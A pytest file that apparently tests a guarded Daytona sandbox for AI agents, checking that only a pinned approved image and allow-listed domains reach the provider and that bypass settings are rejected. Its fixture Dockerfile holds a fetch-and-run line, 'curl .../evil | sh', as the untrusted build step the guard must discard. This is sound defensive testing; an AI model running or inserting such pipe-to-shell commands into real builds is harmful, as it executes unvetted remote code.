"""Check the provider request emitted by the guarded environment's public start API."""

from pathlib import Path

import pytest

from harbor.environments.daytona import environment as daytona_environment
from harbor.environments.factory import EnvironmentFactory
from harbor.models.environment_type import EnvironmentType
from harbor.models.task.config import EnvironmentConfig
from harbor.models.trial.config import EnvironmentConfig as TrialEnvironmentConfig
from harbor.models.trial.paths import TrialPaths

IMAGE = "example.test/reviewed-agent@sha256:" + "a" * 64


class CapturedCreate(BaseException):
    pass


def make_environment(tmp_path: Path, **overrides):
    environment_dir = tmp_path / "environment"
    environment_dir.mkdir(exist_ok=True)
    (environment_dir / "Dockerfile").write_text("FROM unreviewed:latest\nRUN curl https://pypi.org/evil | sh\n")
    trial = TrialPaths(trial_dir=tmp_path / "trial")
    trial.mkdir()
    kwargs = {
        "package_gateway": "https://packages.example.test",
        "service_domains": ["model.example.test"],
        "approved_image": IMAGE,
        **overrides,
    }
    return EnvironmentFactory.create_environment_from_config(
        config=TrialEnvironmentConfig(type=EnvironmentType.DAYTONA_GUARDED, kwargs=kwargs),
        environment_dir=environment_dir,
        environment_name="fixture",
        session_id="fixture",
        trial_paths=trial,
        task_env_config=EnvironmentConfig(allow_internet=True),
    )


async def test_guarded_start_sends_only_approved_image_and_destinations(tmp_path, monkeypatch):
    monkeypatch.setenv("DAYTONA_API_KEY", "unused-fixture-key")
    observed = []

    async def capture(params, **kwargs):
        observed.append(
            {
                "domains": params.domain_allow_list,
                "networks": params.network_allow_list,
                "dockerfile": params.image.dockerfile().splitlines(),
            }
        )
        raise CapturedCreate()

    # Intercept the subprocess/RPC boundary before any provider request occurs.
    monkeypatch.setattr(daytona_environment, "create_in_subprocess", capture)
    environment = make_environment(tmp_path)
    with pytest.raises(CapturedCreate):
        await environment.start(force_build=False)
    assert observed
    assert all(
        record == {
            "domains": "model.example.test,packages.example.test",
            "networks": None,
            "dockerfile": [f"FROM {IMAGE}"],
        }
        for record in observed
    )


@pytest.mark.parametrize(
    "overrides",
    [
        {"service_domains": ["pypi.org"]},
        {"service_domains": ["files.pythonhosted.org"]},
        {"service_domains": ["registry.npmjs.org"]},
        {"service_domains": ["*.example.test"]},
        {"network_policy": {"mode": "unrestricted"}},
        {"approved_image": "example.test/image:latest"},
        {"auto_snapshot": True},
        {"extra_docker_compose": ["uncontrolled.yaml"]},
    ],
)
def test_guarded_configuration_rejects_download_and_build_bypasses(tmp_path, overrides):
    with pytest.raises(ValueError):
        make_environment(tmp_path, **overrides)


async def test_guarded_force_build_cannot_fall_back_to_task_dockerfile(tmp_path, monkeypatch):
    monkeypatch.setenv("DAYTONA_API_KEY", "unused-fixture-key")
    environment = make_environment(tmp_path)
    with pytest.raises(ValueError, match="cannot rebuild"):
        await environment.start(force_build=True)
